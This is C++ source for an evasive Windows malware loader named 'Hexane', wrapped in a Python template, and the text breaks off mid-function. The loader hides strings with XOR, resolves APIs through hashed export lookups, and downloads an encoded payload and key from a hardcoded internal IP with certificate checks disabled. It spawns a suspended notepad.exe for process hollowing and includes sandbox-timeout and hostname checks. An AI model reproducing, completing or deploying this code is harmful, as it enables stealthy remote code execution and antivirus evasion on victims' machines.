ApiList = [

    ".reloc",
    ".text",
    "LENOVO-WRKSTN-L",
    "http://192.168.8.129",
    "http://192.168.8.129/x86-calculator.b64",
    "http://192.168.8.129/x64-calculator.b64",
    "\\??\\C:\\Windows\\System32\\notepad.exe",
    "ntdll.dll",
    "KERNEL32.DLL",
    "GetThreadContext",
    "SetThreadContext",
    "Wow64GetThreadContext",
    "Wow64SetThreadContext",
    "NtResumeThread",
    "IsWow64Process",
    "RtlDestroyProcessParameters",
    "RtlCreateProcessParametersEx",
    "RtlInitUnicodeString",
    "NtCreateUserProcess",
    "NtQueryInformationProcess",
    "NtTerminateProcess",
    "NtClose",
    "NtFreeVirtualMemory",
    "NtAllocateVirtualMemory",
    "NtQueryVirtualMemory",
    "NtProtectVirtualMemory",
    "NtReadVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateSection",
    "NtUnmapViewOfSection",
    "NtMapViewOfSection",
    "RtlCreateHeap",
    "RtlAllocateHeap",
    "RtlFreeHeap",
    "RtlDestroyHeap",
    "GetComputerNameExA",
    "GlobalMemoryStatusEx"
]

Hexane = """

#ifndef HEXANE_LOADER2_HEXANE_HPP
#define HEXANE_LOADER2_HEXANE_HPP
#include "standard.hpp"
#include "multitool.hpp"
#include "ntimports.hpp"
#include "structs.hpp"

#define USER_AGENT  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
#define KEYSTORE    "http://192.168.8.129/keystore"
#ifdef _DEBUG
#define PROXY_NAME "127.0.0.1:8080"
#define INTERNET_OPEN_TYPE INTERNET_OPEN_TYPE_PROXY
#else
#define PROXY_NAME nullptr
#define INTERNET_OPEN_TYPE INTERNET_OPEN_TYPE_PRECONFIG
#endif


#pragma region MACROS

#define SANDBOX_TIMEOUT                                         (__timeout(SLEEPTIME * 10))
#define IMAGE_DOS_HEADER_OFFSET_POINTER(image)                  (reinterpret_cast<PIMAGE_DOS_HEADER>(image))
#define IMAGE_NT_HEADERS_OFFSET_POINTER(image, dosHead)         (reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD64>(image) + dosHead->e_lfanew))
#define IMAGE_EXPORT_DIRECTORY_OFFSET_POINTER(dosHead, ntHead)  (reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<PBYTE>(dosHead) + (ntHead)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
#define CALCULATE_IMAGE_SECTION_HEADER(image)                   (reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD64>(image->lpBuffer) + image->pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
#define CALCULATE_DESTINATION_SECTION(process, image)           (reinterpret_cast<PVOID>(reinterpret_cast<DWORD64>(process->lpBaseAddress) + image->RelocSection->VirtualAddress))
#define CALCULATE_SOURCE_SECTION(image)                         (reinterpret_cast<PVOID>(reinterpret_cast<DWORD64>(image->lpBuffer) + image->RelocSection->PointerToRawData))
#define BASE_RELOCATION_ENTRIES(image, offset)                  (reinterpret_cast<PBASE_RELOCATION_ENTRY>(reinterpret_cast<DWORD64>(image->lpBuffer) + image->RelocSection->PointerToRawData + offset))
#define TARGET_RELOCATION_BLOCK(image, offset)                  (reinterpret_cast<PBASE_RELOCATION_BLOCK>(reinterpret_cast<DWORD64>(image->lpBuffer) + image->RelocSection->PointerToRawData + offset))
#define BASE_RELOCATION_COUNT(block)                            (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / sizeof(BASE_RELOCATION_ENTRY))

#define XOR_MODULO(key, data, i)                                (data[i] ^ key[i % 24])
#define ARRAY_LEN(string)                                       (sizeof(string) / sizeof(string[0]) - 1)
#define GLOBAL_SYSTEM_MEMORY_IN_GB(memory)                      (static_cast<float>(memory.ullTotalPhys) / GIGABYTES)
#define FNV_OFFSET_BASIS			                            (const unsigned int) 2166136261
#define FNV_PRIME                                               (const unsigned int) 16777619

#define IN_MEMORY_ORDER_MODULE_LIST                             (reinterpret_cast<PLIST_ENTRY> (&(PEB_POINTER)->Ldr->InMemoryOrderModuleList))
#define TARGET_MODULE_ENTRY(next)                               (reinterpret_cast<PLDR_MODULE> (reinterpret_cast<PBYTE>(next) - SIZEOF_MODULE_ENTRY))
#define TARGET_MODULE_NAME(mod)                                 (mod->BaseDllName.Buffer)
#define SIZEOF_MODULE_ENTRY                                     (sizeof(DWORD) * 4)

#define PEB_POINTER64                                           (reinterpret_cast<PPROCESS_ENVIRONMENT_BLOCK> (__readgsqword(0x60)))
#define PEB_POINTER32                                           (reinterpret_cast<PPROCESS_ENVIRONMENT_BLOCK> (__readfsdword(0x30)))
#define SIZEOF_PS_ATTRIBUTE_LIST(count)                         (sizeof(PS_ATTRIBUTE_LIST) + (sizeof(PS_ATTRIBUTE) * (count -1)))

#ifdef _M_X64
    #define PEB_POINTER PEB_POINTER64
    #define PAYLOAD PAYLOAD64

    #define CHECK_MACHINE(image)                                                                        \\
    if ((Datastore->pDosHeader->e_magic) != IMAGE_DOS_SIGNATURE||                                       \\
       (Datastore->pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64))                         \\
            return STATUS_FAILED;
#elif _M_IX86
    #define PEB_POINTER PEB_POINTER32
    #define PAYLOAD PAYLOAD32

    #define CHECK_MACHINE(image)                                                                        \\
    if ((Datastore->pDosHeader->e_magic) != IMAGE_DOS_SIGNATURE||                                       \\
       (Datastore->pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386))                          \\
            return STATUS_FAILED;
#endif

#define SET_HEADERS_AND_CHECK_DATA(object)                                                                          \\
    Datastore->pDosHeader   = IMAGE_DOS_HEADER_OFFSET_POINTER(Datastore->lpBuffer);                                 \\
    object->pNtHeaders   = IMAGE_NT_HEADERS_OFFSET_POINTER(Datastore->lpBuffer, Datastore->pDosHeader);             \\
    object->RelocDirectory = Datastore->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];  \\
    CHECK_MACHINE(object);

#pragma endregion MACROS

#pragma region TYPES
using NtFreeVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
using NtAllocateVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
using NtProtectVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
using NtReadVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
using NtWriteVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
using NtQueryVirtualMemory_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);

using NtCreateSection_t = NTSTATUS (__stdcall*)( PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
using NtMapViewOfSection_t = NTSTATUS (__stdcall*)( HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using NtUnmapViewOfSection_t = NTSTATUS (__stdcall*) ( HANDLE ProcessHandle, PVOID BaseAddress);

using RtlCreateHeap_t = PVOID (__stdcall*)( ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters);
using RtlAllocateHeap_t = PVOID (__stdcall*)( PVOID HeapHandle, ULONG Flags, SIZE_T Size);
using RtlFreeHeap_t = LOGICAL (__stdcall*)( PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
using RtlDestroyHeap_t = PVOID (__stdcall*)( PVOID HeapHandle);

using RtlInitUnicodestring_t = VOID (__stdcall*)( PUNICODE_STRING Destinationstring, PCWSTR Sourcestring);
using RtlCreateProcessParametersEx_t = NTSTATUS (__stdcall*)( PRTL_USER_PROCESS_PARAMETERS* pProcessParams, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
using RtlDestroyProcessParameters_t = NTSTATUS (__stdcall*)( PRTL_USER_PROCESS_PARAMETERS procParams);

using CryptStringToBinaryA_t = BOOL (__stdcall*)( LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
using NtCreateUserProcess_t = NTSTATUS (__stdcall*)( PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS procParams, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST ProcessAttributeList);
using IsWow64Process_t = BOOL (__stdcall*)( HANDLE hProcess, PBOOL Wow64Process);
using GlobalMemoryStatusEx_t = BOOL (__stdcall*)( LPMEMORYSTATUSEX lpBuffer);

using NtQueryInformationProcess_t = LONG (__stdcall*)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, DWORD ProcessInformationLength, PDWORD ReturnLength);
using GetComputerNameExA_t = BOOL (__stdcall*)( COMPUTER_NAME_FORMAT NameType, LPSTR lpBuffer, LPDWORD nSize);
using NtTerminateProcess_t = NTSTATUS (__stdcall*)( HANDLE ProcessHandle, NTSTATUS ExitStatus);
using NtClose_t = NTSTATUS (__stdcall*)( HANDLE hObject);

using Wow64GetThreadContext_t = BOOL (__stdcall*)( HANDLE hThread, PWOW64_CONTEXT lpContext);
using Wow64SetThreadContext_t = BOOL (__stdcall*)( HANDLE hThread, WOW64_CONTEXT *lpContext);
using GetThreadContext_t = BOOL (__stdcall*)( HANDLE hThread, LPCONTEXT lpContext);
using SetThreadContext_t = BOOL (__stdcall*)( HANDLE hThread, CONTEXT *lpContext);
using NtResumeThread_t = NTSTATUS (__stdcall*)( HANDLE hThread, PULONG PrviousSuspendCount);
#pragma endregion TYPES

using VirtualAllocEx_t = LPVOID (__stdcall*)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect );
using WriteProcessMemory_t = BOOL (__stdcall*)( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
using ReadProcessMemory_t = BOOL (__stdcall*)( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);

struct API_ {{

    STRING key;

    UCHAR agent;
    UCHAR domain;
    UCHAR hostname;
    UCHAR process;
    UCHAR endpoint;
    UCHAR payload86;
    UCHAR payload64;
    UCHAR relocSection;
    UCHAR textSection;

    NtFreeVirtualMemory_t lpNtFreeVirtualMemory;
    NtAllocateVirtualMemory_t lpNtAllocateVirtualMemory;
    NtProtectVirtualMemory_t lpNtProtectVirtualMemory;
    NtReadVirtualMemory_t lpNtReadVirtualMemory;
    NtWriteVirtualMemory_t lpNtWriteVirtualMemory;
    NtQueryVirtualMemory_t lpNtQueryVirtualMemory;
    NtCreateSection_t lpNtCreateSection;
    NtMapViewOfSection_t lpNtMapViewOfSection;
    NtUnmapViewOfSection_t lpNtUnmapViewOfSection;

    RtlCreateHeap_t lpRtlCreateHeap;
    RtlAllocateHeap_t lpRtlAllocateHeap;
    RtlFreeHeap_t lpRtlFreeHeap;
    RtlDestroyHeap_t lpRtlDestroyHeap;

    NtCreateUserProcess_t lpNtCreateUserProcess;
    RtlInitUnicodestring_t lpRtlInitUnicodestring;
    RtlCreateProcessParametersEx_t lpRtlCreateProcessParametersEx;
    RtlDestroyProcessParameters_t lpRtlDestroyProcessParameters;

    IsWow64Process_t lpIsWow64Process;
    CryptStringToBinaryA_t lpCryptStringToBinaryA;
    GlobalMemoryStatusEx_t lpGlobalMemoryStatusEx;
    GetComputerNameExA_t lpGetComputerNameExA;
    NtQueryInformationProcess_t lpNtQueryInformationProcess;
    NtTerminateProcess_t lpNtTerminateProcess;
    NtClose_t lpNtClose;

    GetThreadContext_t lpGetThreadContext;
    SetThreadContext_t lpSetThreadContext;
    Wow64GetThreadContext_t lpWow64GetThreadContext;
    Wow64SetThreadContext_t lpWow64SetThreadContext;
    NtResumeThread_t lpNtResumeThread;

    VirtualAllocEx_t lpVirtualAllocEx;
    WriteProcessMemory_t lpWriteProcessMemory;
    ReadProcessMemory_t lpReadProcessMemory;

}};

typedef API_ API;
typedef API_* PAPI;
typedef const API_& RAPI;
typedef DATASTORE_ DATASTORE;
typedef DATASTORE_* PDATASTORE;
typedef const DATASTORE_& RDATASTORE;
typedef PROCESS_OBJECT_ PROCESS_OBJECT;
typedef PROCESS_OBJECT_* PPROCESS_OBJECT;
typedef const PROCESS_OBJECT_& RPROCESS_OBJECT;
typedef const char* CPCHAR;

namespace Hexane {{

    namespace Cipher {{

        void xor_cipher(PUCHAR string, CPCHAR key, SIZE_T nBytes) {{
            for (auto i = 0; i < nBytes; i++)
                string[i] = XOR_MODULO(key, string, i);
        }}

        template<typename MUT_TYPE>
        DWORD GetHashFromString(MUT_TYPE string, SIZE_T nBytes) {{

            auto hash = FNV_OFFSET_BASIS;
            for (size_t i = 0; i < nBytes; i++) {{

                hash ^= string[i];
                hash *= FNV_PRIME;
            }}
            return hash;
        }}

        DWORD HashWrapper(PUCHAR string, CPCHAR key, SIZE_T nBytes, BOOL bWchar) {{

            DWORD dwContent = 0;
            xor_cipher(string, key, nBytes);

            if (bWchar == true) {{
                PWCHAR wcsContent = __convert_mbstowcs((char*)string, nBytes);
                dwContent = GetHashFromString(wcsContent, nBytes);

                __alt_memset(wcsContent, 0, nBytes);
            }}
            if (bWchar == false)
                dwContent = GetHashFromString(string, nBytes);

            if (string != nullptr)
                __alt_memset(string, 0, nBytes);

            return dwContent;
        }}
    }}

    namespace Memory {{
        using namespace Hexane::Cipher;

        template<typename MUT_TYPE>
        MUT_TYPE RVA2VA(LPVOID Base, LONG Rva) {{ return (MUT_TYPE) ((ULONG_PTR) Base + Rva); }}

        HMODULE GetModuleList(DWORD dllHash) {{

            auto pListHead = IN_MEMORY_ORDER_MODULE_LIST;
            auto pListNext = pListHead->Flink;

            while (pListNext != pListHead) {{
                auto module = TARGET_MODULE_ENTRY(pListNext);
                auto moduleName = TARGET_MODULE_NAME(module);

                if (moduleName != nullptr) {{
                    if (dllHash - GetHashFromString(moduleName, __alt_wcslen(moduleName)) == 0)
                        return (HMODULE) module->BaseAddress;
                }}
                pListNext = pListNext->Flink;
            }}
            return nullptr;
        }}

        FARPROC GetSymbolAddress(HMODULE imageBase, DWORD functionHash) {{

            if (imageBase == nullptr) return nullptr;

            auto dosHeader = IMAGE_DOS_HEADER_OFFSET_POINTER(imageBase);
            auto ntHeaders = IMAGE_NT_HEADERS_OFFSET_POINTER(imageBase, dosHeader);
            auto exportDir = IMAGE_EXPORT_DIRECTORY_OFFSET_POINTER(dosHeader, ntHeaders);

            if (exportDir->AddressOfNames) {{
                auto ordinals = RVA2VA<PWORD>(imageBase, (long) exportDir->AddressOfNameOrdinals);
                auto functions = RVA2VA<PDWORD>(imageBase, (long) exportDir->AddressOfFunctions);
                auto names = RVA2VA<PDWORD>(imageBase, (long) exportDir->AddressOfNames);

                for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {{

                    auto nameptr = RVA2VA<LPSTR>(imageBase, (long) names[i]);
                    if (GetHashFromString((PUCHAR) nameptr, __alt_strlen((PUCHAR) nameptr)) == functionHash) {{

                        auto *symbolAddress = RVA2VA<PULONG>(imageBase, (long) functions[ordinals[i]]);
                        return reinterpret_cast<FARPROC> (symbolAddress);
                    }}
                }}
            }}
            return nullptr;
        }}
    }}
    
    namespace Network {{

        STATUS WininetLoader(PDATASTORE Datastore, LPCSTR lpszUrl, BOOL bSSL, BOOL bKeys, PAPI Api) {{

            DWORD dwConnectFlags = INTERNET_FLAG_RELOAD;

            HINTERNET hSession = InternetOpenA((LPSTR) USER_AGENT, INTERNET_OPEN_TYPE, PROXY_NAME, nullptr, 0);
            if (!hSession)
                return STATUS_FAILED;

            if (bSSL == TRUE) dwConnectFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

            HINTERNET hConnection = InternetOpenUrlA(hSession, lpszUrl, nullptr, 0, dwConnectFlags, 0);
            if (!hConnection)
                return STATUS_FAILED;

            LPVOID lpQueryAvailable             = nullptr;
            DWORD dwBytesRead, dwBufferSize     = 0;

            query:
            if (!HttpQueryInfoA(hConnection, HTTP_QUERY_CONTENT_LENGTH, lpQueryAvailable, &dwBytesRead, nullptr)) {{
                if (GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {{
                    return STATUS_FAILED;

                }} else {{
                    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {{
                        lpQueryAvailable = new CHAR[dwBytesRead];
                        goto query;

                    }} else return STATUS_FAILED;
                }}
            }}
            dwBytesRead 	= 0;
            dwBufferSize 	= atol((PCHAR) lpQueryAvailable);

            auto download = new CHAR[dwBufferSize];

            do {{
                if (bKeys == false) {{
                    InternetReadFile(hConnection, download, dwBufferSize, &dwBytesRead);
                    Datastore->TempBuffer.append(download, dwBytesRead);
                }}
                if (bKeys == true) {{
                    InternetReadFile(hConnection, download, dwBufferSize, &dwBytesRead);
                    Api->key.append(download, dwBytesRead);
                }}

            }} while (dwBytesRead != 0);

            delete[] download;

            InternetCloseHandle(hSession);
            return STATUS_SUCCESS;
        }}
    }}

    namespace Process {{

        VOID ExitUserProcess(PROCESS_OBJECT Process, API Api) {{

            if (Process.hThread != nullptr) {{
                Api.lpNtClose(Process.hThread);
            }}
            if (Process.hProcess != nullptr) {{
                Api.lpNtTerminateProcess(Process.hProcess,0x40000001);
                Api.lpNtClose(Process.hProcess);
            }}
            if (Process.pProcessParams != nullptr) {{
                __alt_memset(Process.pProcessParams, 0, sizeof(&Process.pProcessParams));
                Api.lpRtlDestroyProcessParameters(Process.pProcessParams);
            }}
            if (Process.lpBaseAddress != nullptr) {{
                Api.lpNtFreeVirtualMemory(Process.hProcess, &Process.lpBaseAddress, nullptr, MEM_RELEASE);
            }}
            if (Process.lpProcessHeap != nullptr) {{
                Api.lpRtlFreeHeap(Process.lpProcessHeap, 0, Process.pAttributeList);
                Api.lpRtlDestroyHeap(Process.lpProcessHeap);
            }}
        }}

        STATUS CreateUserProcess(LPSTR lpszProcessName, PPROCESS_OBJECT Process, API Api) {{

            BOOL isWow64    = false;
            SIZE_T strlen   = __alt_strlen((PUCHAR) lpszProcessName);
            PWCHAR wcsName  = __convert_mbstowcs((PCHAR) lpszProcessName, strlen);

            Process->pProcessParams     = nullptr;
            Api.lpRtlInitUnicodestring(&Process->lpszTargetString, wcsName);
            Api.lpRtlCreateProcessParametersEx(&Process->pProcessParams, &Process->lpszTargetString, nullptr, DESKTOP_ENVIRONMENT_NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

            Process->CreateInfo         = EMPTY_OBJECT;
            Process->CreateInfo.Size    = sizeof(Process->CreateInfo);
            Process->CreateInfo.State   = PsCreateInitialState;

            Process->lpProcessHeap      = Api.lpRtlCreateHeap(HEAP_GROWABLE, nullptr, 0, 0, nullptr, nullptr);
            Process->pAttributeList     = (PPS_ATTRIBUTE_LIST) Api.lpRtlAllocateHeap(Process->lpProcessHeap, HEAP_ZERO_MEMORY, SIZEOF_PS_ATTRIBUTE_LIST(1));

            Process->pAttributeList->TotalLength             = SIZEOF_PS_ATTRIBUTE_LIST(1);
            Process->pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
            Process->pAttributeList->Attributes[0].Size      = Process->lpszTargetString.Length;
            Process->pAttributeList->Attributes[0].Value     = (ULONG_PTR) Process->lpszTargetString.Buffer;

            Api.lpNtCreateUserProcess(&Process->hProcess, &Process->hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, Process->pProcessParams, &Process->CreateInfo, Process->pAttributeList);

#ifdef _WIN64
            Api.lpIsWow64Process(Process->hProcess, &isWow64);
            if (isWow64 == true)
                return STATUS_FAILED;
#elif _WIN32
            Api.lpIsWow64Process(Process->hProcess, &isWow64);
            if (isWow64 == false)
                return STATUS_FAILED;
#endif
            return STATUS_SUCCESS;
        }}
    }}

    namespace Api {{
        using namespace Hexane::Cipher;
        using namespace Hexane::Memory;

        void ResolveSymbols(PAPI Api) {{

            unsigned char strReloc[] = {{ {} }};
            xor_cipher(strReloc, Api->key.c_str(), ARRAY_LEN(strReloc));
            __alt_strcpy(&Api->relocSection, strReloc);
            
            unsigned char strText[] = {{ {} }};
            xor_cipher(strText, Api->key.c_str(), ARRAY_LEN(strText));
            __alt_strcpy(&Api->textSection, strText);

            unsigned char strHostname[] = {{ {} }};
            xor_cipher(strHostname, Api->key.c_str(), ARRAY_LEN(strHostname));
            __alt_strcpy(&Api->hostname, strHostname);

            unsigned char strEndpoint[] = {{ {} }};
            xor_cipher(strEndpoint, Api->key.c_str(), ARRAY_LEN(strEndpoint));
            __alt_strcpy(&Api->endpoint, strEndpoint);

            unsigned char strPayload86[] = {{ {} }};
            xor_cipher(strPayload86, Api->key.c_str(), ARRAY_LEN(strPayload86));
            __alt_strcpy(&Api->payload86, strPayload86);

            unsigned char strPayload64[] = {{ {} }};
            xor_cipher(strPayload64, Api->key.c_str(), ARRAY_LEN(strPayload64));
            __alt_strcpy(&Api->payload64, strPayload64);

            unsigned char strProcess[] = {{ {} }};
            xor_cipher(strProcess, Api->key.c_str(), ARRAY_LEN(strProcess));
            __alt_strcpy(&Api->process, strProcess);
            
#pragma region MODULES
            unsigned char strNtdll[] = {{ {} }};
            DWORD dwNtdll = HashWrapper(strNtdll, Api->key.c_str(), ARRAY_LEN(strNtdll), true);
            HMODULE hmNtdll = GetModuleList(dwNtdll);

            unsigned char strKernel32[] = {{ {} }};
            DWORD dwKernel32 = HashWrapper(strKernel32, Api->key.c_str(), ARRAY_LEN(strKernel32), true);
            HMODULE hmKernel32 = GetModuleList(dwKernel32);
#pragma endregion MODULES

#pragma region THREADS
            unsigned char strGetThreadContext[] = {{ {} }};
            DWORD dwGetThreadContext = HashWrapper(strGetThreadContext, Api->key.c_str(), ARRAY_LEN(strGetThreadContext), false);
            Api->lpGetThreadContext = (GetThreadContext_t) GetSymbolAddress(hmKernel32, dwGetThreadContext);

            unsigned char strSetThreadContext[] = {{ {} }};
            DWORD dwSetThreadContext = HashWrapper(strSetThreadContext, Api->key.c_str(), ARRAY_LEN(strSetThreadContext), false);
            Api->lpSetThreadContext = (SetThreadContext_t) GetSymbolAddress(hmKernel32, dwSetThreadContext);

            unsigned char strWow64GetThreadContext[] = {{ {} }};
            DWORD dwWow64GetThreadContext = HashWrapper(strWow64GetThreadContext, Api->key.c_str(), ARRAY_LEN(strWow64GetThreadContext), false);
            Api->lpWow64GetThreadContext = (Wow64GetThreadContext_t) GetSymbolAddress(hmKernel32, dwWow64GetThreadContext);

            unsigned char strWow64SetThreadContext[] = {{ {} }}; 
            DWORD dwWow64SetThreadContext = HashWrapper(strWow64SetThreadContext, Api->key.c_str(), ARRAY_LEN(strWow64SetThreadContext), false);
            Api->lpWow64SetThreadContext = (Wow64SetThreadContext_t) GetSymbolAddress(hmKernel32, dwWow64SetThreadContext);

            unsigned char strNtResumeThread[] = {{ {} }}; 
            DWORD dwNtResumeThread = HashWrapper(strNtResumeThread, Api->key.c_str(), ARRAY_LEN(strNtResumeThread), false);
            Api->lpNtResumeThread = (NtResumeThread_t) GetSymbolAddress(hmNtdll, dwNtResumeThread);
#pragma endregion THREADS

#pragma region PROCESS
            unsigned char strIsWow64Process[] = {{ {} }}; 
            DWORD dwIsWow64Process = HashWrapper(strIsWow64Process, Api->key.c_str(), ARRAY_LEN(strIsWow64Process), false);
            Api->lpIsWow64Process = (IsWow64Process_t) GetSymbolAddress(hmKernel32, dwIsWow64Process);

            unsigned char strRtlDestroyProcessParameters[] = {{ {} }}; 
            DWORD dwRtlDestroyProcessParameters = HashWrapper(strRtlDestroyProcessParameters, Api->key.c_str(), ARRAY_LEN(strRtlDestroyProcessParameters), false);
            Api->lpRtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetSymbolAddress(hmNtdll, dwRtlDestroyProcessParameters);

            unsigned char strRtlCreateProcessParametersEx[] = {{ {} }}; 
            DWORD dwRtlCreateProcessParametersEx = HashWrapper(strRtlCreateProcessParametersEx, Api->key.c_str(), ARRAY_LEN(strRtlCreateProcessParametersEx), false);
            Api->lpRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetSymbolAddress(hmNtdll, dwRtlCreateProcessParametersEx);

            unsigned char strRtlInitUnicodeString[] = {{ {} }}; 
            DWORD dwRtlInitUnicodeString = HashWrapper(strRtlInitUnicodeString, Api->key.c_str(), ARRAY_LEN(strRtlInitUnicodeString), false);
            Api->lpRtlInitUnicodestring = (RtlInitUnicodestring_t) GetSymbolAddress(hmNtdll, dwRtlInitUnicodeString);

            unsigned char strNtCreateUserProcess[] = {{ {} }}; 
            DWORD dwNtCreateUserProcess = HashWrapper(strNtCreateUserProcess, Api->key.c_str(), ARRAY_LEN(strNtCreateUserProcess), false);
            Api->lpNtCreateUserProcess = (NtCreateUserProcess_t) GetSymbolAddress(hmNtdll, dwNtCreateUserProcess);

            unsigned char strNtQueryInformationProcess[]  = {{ {} }}; 
            DWORD dwNtQueryInformationProcess = HashWrapper(strNtQueryInformationProcess, Api->key.c_str(), ARRAY_LEN(strNtQueryInformationProcess), false);
            Api->lpNtQueryInformationProcess = (NtQueryInformationProcess_t) GetSymbolAddress(hmNtdll, dwNtQueryInformationProcess);

            unsigned char strNtTerminateProcess[] = {{ {} }}; 
            DWORD dwNtTerminateProcess = HashWrapper(strNtTerminateProcess, Api->key.c_str(), ARRAY_LEN(strNtTerminateProcess), false);
            Api->lpNtTerminateProcess = (NtTerminateProcess_t) GetSymbolAddress(hmNtdll, dwNtTerminateProcess);

            unsigned char strNtClose[] = {{ {} }}; 
            DWORD dwNtClose = HashWrapper(strNtClose, Api->key.c_str(), ARRAY_LEN(strNtClose), false);
            Api->lpNtClose = (NtClose_t) GetSymbolAddress(hmNtdll, dwNtClose);
#pragma endregion PROCESS

#pragma region MEMORY
            unsigned char strNtFreeVirtualMemory[] = {{ {} }}; 
            DWORD dwNtFreeVirtualMemory = HashWrapper(strNtFreeVirtualMemory, Api->key.c_str(), ARRAY_LEN(strNtFreeVirtualMemory), false);
            Api->lpNtFreeVirtualMemory = (NtFreeVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtFreeVirtualMemory);

            unsigned char strNtAllocateVirtualMemory[] = {{ {} }}; 
            DWORD dwNtAllocateVirtualMemory = HashWrapper(strNtAllocateVirtualMemory, Api->key.c_str(), ARRAY_LEN(strNtAllocateVirtualMemory), false);
            Api->lpNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtAllocateVirtualMemory);

            unsigned char strNtQueryVirtualMemory[] = {{ {} }}; 
            DWORD dwNtQueryVirtualMemory = HashWrapper(strNtQueryVirtualMemory, Api->key.c_str(), ARRAY_LEN(strNtQueryVirtualMemory), false);
            Api->lpNtQueryVirtualMemory = (NtQueryVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtQueryVirtualMemory);

            unsigned char strNtProtectVirtualMemory[] = {{ {} }}; 
            DWORD dwNtProtectVirtualMemory = HashWrapper(strNtProtectVirtualMemory, Api->key.c_str(), ARRAY_LEN(strNtProtectVirtualMemory), false);
            Api->lpNtProtectVirtualMemory = (NtProtectVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtProtectVirtualMemory);

            unsigned char strNtReadVirtualMemory[] = {{ {} }}; 
            DWORD dwNtReadVirtualMemory = HashWrapper(strNtReadVirtualMemory, Api->key.c_str(), ARRAY_LEN(strNtReadVirtualMemory), false);
            Api->lpNtReadVirtualMemory = (NtReadVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtReadVirtualMemory);

            unsigned char strNtWriteVirtualMemroy[] = {{ {} }}; 
            DWORD dwNtWriteVirtualMemory = HashWrapper(strNtWriteVirtualMemroy, Api->key.c_str(), ARRAY_LEN(strNtWriteVirtualMemroy), false);
            Api->lpNtWriteVirtualMemory = (NtWriteVirtualMemory_t) GetSymbolAddress(hmNtdll, dwNtWriteVirtualMemory);
            
            unsigned char strNtCreateSection[] = {{ {} }};
